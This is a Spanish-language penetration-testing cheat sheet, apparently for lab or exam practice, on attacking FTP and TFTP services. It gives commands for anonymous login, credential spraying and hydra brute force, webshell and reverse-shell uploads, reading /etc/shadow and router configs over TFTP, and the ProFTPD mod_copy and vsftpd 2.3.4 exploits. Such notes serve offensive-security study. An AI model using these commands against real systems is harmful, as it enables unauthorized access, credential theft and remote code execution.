# FTP (20 / 21) / TFTP (69)

Tags: #FTP #TFTP #Anonymous #FileTransfer #Reconocimiento #Credenciales

## OBJETIVO

- Identificar si el servidor permite acceso anónimo
- Enumerar archivos y directorios disponibles
- Descargar archivos con información sensible
- Subir archivos si hay permisos de escritura (webshells, reverse shells)
- Obtener credenciales para reutilizar en otros servicios

## TIPS

1. **Probar anonymous:anonymous o anonymous: (sin password) SIEMPRE primero**
2. **Si puedes escribir en el FTP → buscar si la ruta es accesible desde la web → RCE**
3. **FTP en Windows → ruta por defecto C:\inetpub\wwwroot\ → subir webshell**
4. **Credenciales encontradas en otros servicios → probarlas en FTP inmediatamente**
5. **Modo binario obligatorio para archivos no texto → binary antes de get/put**
6. **TFTP usa UDP 69 → no requiere autenticación → probar siempre si el puerto está abierto**

## TOOLS

- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Medusa](https://github.com/jmk-foofus/medusa)

---

## 1. RECONOCIMIENTO INICIAL

```bash
❯ nmap -sC -sV -p 21 <IP>
# Detección de versión + scripts por defecto
# Revela: versión del servidor FTP, si permite anonymous login
# Buscar: vsftpd, ProFTPD, FileZilla Server → buscar CVEs por versión

❯ nmap --script ftp-anon -p 21 <IP>
# Verifica específicamente si anonymous login está habilitado
# Si devuelve listado de archivos → acceso anónimo confirmado

❯ nmap --script ftp-syst -p 21 <IP>
# Obtener tipo de sistema operativo del servidor FTP

❯ nmap --script ftp-bounce -p 21 <IP>
# Verificar si el servidor es vulnerable a FTP bounce attack
# Permite escanear puertos internos a través del FTP

❯ nxc ftp <IP> -u 'anonymous' -p 'anonymous'
# Validar acceso anónimo con netexec
# Más rápido para confirmar antes de conectar manualmente
```

### Insight

- Versión vsftpd 2.3.4 → backdoor conocida → puerto 6200 → ver searchsploit
- ProFTPD 1.3.5 → mod_copy vulnerable → copiar archivos sin auth
- FileZilla Server → credenciales en FileZilla Server.xml

---

## 2. ACCESO ANÓNIMO (SIN CREDENCIALES)

```bash
❯ ftp <IP>
# Intentar conexión → cuando pida usuario: anonymous
# Cuando pida password: anonymous o dejar vacío o cualquier email
# Si dice "230 Login successful" → acceso anónimo habilitado

❯ ftp anonymous@IP   # Otra forma de conexión 

❯ ftp <IP>
  Name: anonymous
  Password: anonymous@domain.com

# Comandos dentro del cliente FTP:
  ❯ help            # Ver todos los comandos disponibles
  ❯ ls / dir        # Listar contenido del directorio actual
  ❯ ls -la          # Listar con archivos ocultos
  ❯ pwd             # Ver directorio actual
  ❯ cd <dir>        # Cambiar de directorio
  ❯ binary          # Cambiar a modo binario → OBLIGATORIO antes de descargar ejecutables
  ❯ get <file>      # Descargar un archivo al directorio actual de Kali
  ❯ put <file>      # Subir un archivo al servidor FTP
  ❯ del <file>      # Borrar un archivo en el FTP
  ❯ bye / exit      # Salir del servidor FTP
```

### Insight

- Siempre usar `binary` antes de descargar → modo ASCII corrompe archivos binarios
- Si hay permisos de escritura → intentar subir webshell → ver sección 5

---

## 3. DESCARGA MASIVA DE ARCHIVOS

```bash
❯ wget -m --no-passive ftp://anonymous:anonymous@<IP>
# Descargar TODO el contenido del FTP recursivamente
# --no-passive → forzar modo activo si el pasivo falla
# Muy útil para no perderse archivos en subdirectorios

❯ wget -m ftp://user:passwd@<IP>
# Con credenciales → mismo comando

❯ wget ftp://anonymous:anonymous@<IP>/<archivo>
# Descargar archivo específico sin entrar al cliente FTP

# Dentro del cliente FTP → descarga masiva interactiva
  ❯ prompt off      # Deshabilitar confirmación por archivo
  ❯ mget *          # Descargar todos los archivos del directorio actual
  ❯ mget *.txt      # Descargar todos los .txt

# Montar FTP como sistema de archivos (si está disponible curlftpfs)
❯ curlftpfs ftp://anonymous:anonymous@<IP> /tmp/ftp_mount/
# Montar el FTP localmente → navegar con cualquier herramienta
❯ umount /tmp/ftp_mount/
# Desmontar cuando termines
```

### Insight

- wget -m → la forma más eficiente de obtener todo el contenido de golpe
- Si hay muchos archivos → grep recursivo después para buscar credenciales

---

## 4. ENUMERACIÓN CON CREDENCIALES

```bash
❯ nxc ftp <IP> -u 'user' -p 'pass'
# Validar credenciales → confirmar acceso antes de conectar

❯ nxc ftp <IP> -u users.txt -p passwords.txt --continue-on-success
# Spraying de credenciales → probar múltiples combinaciones

❯ ftp <IP>
  Name: user
  Password: pass
# Conexión autenticada → mismos comandos que acceso anónimo
```

---

## 5. FUERZA BRUTA DE CREDENCIALES

```bash
❯ hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://<IP>
# Fuerza bruta con usuario conocido → wordlist de passwords

❯ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<IP>
# Lista de usuarios + lista de passwords

❯ hydra -l anonymous -P /usr/share/wordlists/rockyou.txt ftp://<IP> -t 4
# -t 4 → limitar hilos → FTP suele cortar conexiones con demasiados intentos

❯ medusa -h <IP> -u user -P /usr/share/wordlists/rockyou.txt -M ftp
# Alternativa con medusa
```

### Insight

- FTP corta conexiones agresivas → usar -t 4 en hydra para ir más lento
- Probar credenciales encontradas en otros servicios antes de brute force

---

## 6. SUBIDA DE ARCHIVOS (SI HAY ESCRITURA)

```bash
# Dentro del cliente FTP → verificar si puedo escribir
  ❯ put test.txt    # Si no da error → tengo permisos de escritura

# En Windows → ruta por defecto del FTP es C:\inetpub\wwwroot# Si el FTP apunta a la raíz del servidor web → subir webshell → RCE

# Subir webshell PHP
  ❯ binary
  ❯ put shell.php
# Acceder desde el navegador: http://<IP>/shell.php

# Subir webshell ASP (Windows/IIS)
  ❯ binary
  ❯ put shell.asp
# Acceder desde el navegador: http://<IP>/shell.asp

# Subir reverse shell
  ❯ binary
  ❯ put reverse.php
# Poner nc en escucha → acceder desde el navegador
```

### Insight

- FTP con escritura + servidor web activo = RCE muy probable
- Verificar siempre si la ruta del FTP es accesible desde HTTP
- En Windows: C:\inetpub\wwwroot\ → es la ruta del servidor IIS por defecto

---

## 7. BÚSQUEDA DE INFORMACIÓN SENSIBLE

```bash
# Después de descargar archivos → buscar credenciales
❯ grep -ri "password\|passwd\|secret\|key\|user" /tmp/ftp_files/ 2>/dev/null

❯ find /tmp/ftp_files/ -name "*.conf" -o -name "*.xml"   -o -name "*.ini" -o -name "*.txt" -o -name "*.bak" 2>/dev/null
# Buscar archivos de configuración

❯ find /tmp/ftp_files/ -name "*.php" 2>/dev/null
# Scripts PHP pueden contener credenciales de DB

# Archivos especialmente valiosos a buscar
# → wp-config.php, config.php, .htpasswd, web.config
# → backups (.zip, .tar.gz, .bak)
# → claves SSH (id_rsa, *.pem, *.key)
```

---

## 8. TFTP (UDP 69)

```bash
# TFTP → Trivial File Transfer Protocol → sin autenticación
# Usado en dispositivos de red, PXE boot, configuraciones

❯ nmap -sU -p 69 <IP>
# Detectar TFTP → escaneo UDP (-sU)
# UDP es más lento → ser paciente

❯ tftp <IP>
# Conectar al servidor TFTP
  ❯ get <archivo>   # Descargar archivo conocido
  ❯ put <archivo>   # Subir archivo si hay permisos
  ❯ quit            # Salir

❯ tftp <IP> 69
# Especificar puerto explícitamente

# Intentar descargar archivos de configuración comunes
❯ tftp <IP>
  ❯ get /etc/passwd
  ❯ get /etc/shadow
  ❯ get cisco-config.txt
  ❯ get startup-config
  ❯ get running-config
```

### Insight

- TFTP sin autenticación → intentar descargar configs de red (routers/switches)
- startup-config y running-config → configuraciones de Cisco con credenciales
- Si hay escritura → subir archivos de configuración maliciosos

---

## 9. EXPLOITS POR VERSIÓN

```bash
❯ searchsploit vsftpd 2.3.4
# vsftpd 2.3.4 → backdoor → abre shell en puerto 6200

❯ searchsploit proftpd 1.3.5
# ProFTPD 1.3.5 → mod_copy → copiar archivos sin autenticación
# SITE CPFR / SITE CPTO → copiar webshell a directorio web

# ProFTPD mod_copy exploit
❯ nc <IP> 21
  SITE CPFR /etc/passwd
  SITE CPTO /var/www/html/passwd.txt
# Copia archivos sin autenticación si mod_copy está habilitado
```

---

## CONDICIONES CLAVE

- Anonymous login → enumerar todo → buscar credenciales y archivos sensibles
- Credenciales válidas → descargar todo con wget -m
- Permisos de escritura + servidor web → subir webshell → RCE
- TFTP abierto → sin autenticación → intentar descargar configs
- Versión identificada → searchsploit inmediato

## ONE-LINERS MENTALES

- Puerto 21 abierto → probar anonymous:anonymous primero
- Acceso anónimo → wget -m ftp://anonymous:anonymous@IP → descargar todo
- Puedo escribir → servidor web activo → subir webshell → RCE
- vsftpd 2.3.4 → backdoor → puerto 6200
- ProFTPD 1.3.5 → mod_copy → SITE CPFR / SITE CPTO
- UDP 69 abierto → tftp IP → get startup-config